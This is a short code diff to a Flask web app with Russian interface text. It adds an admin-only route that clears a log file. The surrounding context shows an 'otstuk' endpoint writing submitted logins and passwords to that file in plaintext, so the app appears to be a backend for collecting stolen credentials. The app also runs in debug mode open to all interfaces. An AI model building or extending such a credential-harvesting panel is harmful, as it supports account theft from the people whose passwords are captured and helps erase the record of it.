@@ -217,6 +217,19 @@ def otstuk_post():
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             f.write(f"[{timestamp}] Логин: {login} | Пароль: {password}\n")
     return "OK", 200
-
+@app.route('/clear_otstuk', methods=['POST'])
+@login_required
+def clear_otstuk():
+    if getattr(current_user, 'role', None) != 'admin':
+        flash('Доступ запрещён', 'danger')
+        return redirect(url_for('otstuk'))
+    
+    try:
+        open(LOGS_FILE, 'w', encoding='utf-8').close()  # Очищаем файл
+        flash('Логи успешно очищены', 'success')
+    except:
+        flash('Ошибка при очистке логов', 'danger')
+    
+    return redirect(url_for('otstuk'))
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
